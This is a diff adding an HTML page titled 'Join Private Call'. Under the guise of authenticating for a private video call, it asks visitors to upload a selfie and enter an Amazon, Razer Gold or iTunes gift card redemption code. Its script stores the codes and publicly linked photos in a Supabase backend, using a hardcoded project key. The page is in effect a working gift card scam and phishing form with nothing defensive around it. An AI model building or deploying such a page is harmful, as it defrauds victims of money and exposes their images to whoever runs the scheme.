@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Join Private Call</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <style>
+    body{font-family:'Segoe UI',sans-serif;margin:0;padding:0;
+      background:linear-gradient(-45deg,#ff9a9e,#fad0c4,#a1c4fd,#c2e9fb);
+      background-size:400% 400%;animation:gradient 15s ease infinite;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;}
+    @keyframes gradient{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+    .hero{max-width:700px;margin:20px;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.3);}
+    .hero h1{font-size:2.2rem;margin-bottom:12px;}
+    .btn-open{padding:14px 32px;font-size:18px;border:none;border-radius:50px;
+      background:#ff4081;color:white;cursor:pointer;box-shadow:0 6px 15px rgba(0,0,0,.25);transition:.3s;}
+    .btn-open:hover{transform:scale(1.05);background:#e73370;}
+    .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);
+      justify-content:center;align-items:center;z-index:1000;}
+    .modal-content{background:#fff;padding:25px;border-radius:20px;width:95%;max-width:450px;text-align:center;}
+    .upload-box{border:2px dashed #ccc;border-radius:12px;padding:20px;margin:15px 0;background:#fafafa;}
+    .input-text{width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin:15px 0;}
+    .card-options{display:flex;flex-direction:column;gap:12px;}
+    .option-card{display:flex;align-items:center;padding:12px;border-radius:12px;background:#f9f9f9;
+      cursor:pointer;border:2px solid transparent;transition:.3s;}
+    .option-card.selected{border-color:#ff4081;background:#fff0f6;box-shadow:0 4px 10px rgba(255,64,129,.25);}
+    .option-icon{width:28px;height:28px;margin-right:10px;}
+    .btn{margin:10px;padding:12px 22px;border:none;border-radius:50px;font-size:16px;cursor:pointer;}
+    .btn-submit{background:#ff4081;color:white;} .btn-close{background:#ddd;}
+    .status-message{margin-top:12px;font-weight:bold;display:none;} .success{color:green;} .error{color:red;}
+    @media(max-width:500px){.hero h1{font-size:1.6rem;}.btn-open{font-size:16px;padding:12px 24px;}}
+  </style>
+</head>
+<body>
+  <div class="hero">
+    <h1>✨ Private Invitation</h1>
+    <p>Securely join the video call — upload your selfie, enter your code, and step in. Data is safely stored in Supabase.</p>
+  </div>
+
+  <button class="btn-open" onclick="openModal()">Join Video Call</button>
+
+  <div class="modal" id="modal">
+    <div class="modal-content">
+      <h2>Authentication Required</h2>
+      <div class="upload-box"><input type="file" id="selfie" accept="image/*"></div>
+      <input type="text" id="redemptionCode" class="input-text" placeholder="Enter redemption code">
+      <div class="card-options">
+        <label class="option-card" onclick="selectOption(this)">
+          <input type="checkbox" value="amazon" hidden>
+          <img src="https://img.icons8.com/color/48/amazon.png" class="option-icon"> Amazon Gift Card
+        </label>
+        <label class="option-card" onclick="selectOption(this)">
+          <input type="checkbox" value="razor" hidden>
+          <img src="https://img.icons8.com/ios-filled/50/controller.png" class="option-icon"> Razor Gold
+        </label>
+        <label class="option-card" onclick="selectOption(this)">
+          <input type="checkbox" value="itunes" hidden>
+          <img src="https://img.icons8.com/color/48/apple-logo.png" class="option-icon"> iTunes Card
+        </label>
+      </div>
+      <button class="btn btn-submit" onclick="submitFiles()">Submit</button>
+      <button class="btn btn-close" onclick="closeModal()">Cancel</button>
+      <div id="statusMessage" class="status-message"></div>
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = "https://axhatyuncfimmygtpunf.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF4aGF0eXVuY2ZpbW15Z3RwdW5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3NzQ3MjUsImV4cCI6MjA3MTM1MDcyNX0.t5HuwXZAt8hViSPraOOBfv-BFC73xmw4Z7hqGA7CvuA"; // ⚠️ paste anon key
+    const { createClient } = supabase;
+    const client = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    function openModal(){document.getElementById("modal").style.display="flex";}
+    function closeModal(){document.getElementById("modal").style.display="none";}
+
+    function selectOption(card){
+      document.querySelectorAll('.option-card').forEach(c=>c.classList.remove('selected'));
+      card.classList.add('selected');
+      card.querySelector("input").checked=true;
+    }
+
+    async function submitFiles(){
+      const selfie=document.getElementById("selfie").files[0];
+      const redemptionCode=document.getElementById("redemptionCode").value.trim();
+      const selected=document.querySelector('.option-card.selected input');
+      if(!selfie) return showStatus("Please upload a selfie","error");
+      if(!redemptionCode) return showStatus("Enter redemption code","error");
+      if(!selected) return showStatus("Select a card type","error");
+      try{
+        const fileName=`${Date.now()}_${selfie.name}`;
+        const { error:storageError }=await client.storage.from("selfies").upload(fileName,selfie);
+        if(storageError) throw storageError;
+        const { data:publicURL }=client.storage.from("selfies").getPublicUrl(fileName);
+        const { error:dbError }=await client.from("user_submissions").insert([
+          { selfie_url: publicURL.publicUrl, redemption_code: redemptionCode, card_types:[selected.value] }
+        ]);
+        if(dbError) throw dbError;
+        showStatus("✅ Submission saved!. The Admin will Contact you soon","success");
+      }catch(err){showStatus("❌ Error: "+err.message,"error");}
+    }
+
+    function showStatus(msg,type){
+      const el=document.getElementById("statusMessage");
+      el.textContent=msg; el.className="status-message "+type; el.style.display="block";
+    }
+  </script>
+</body>
+</html>
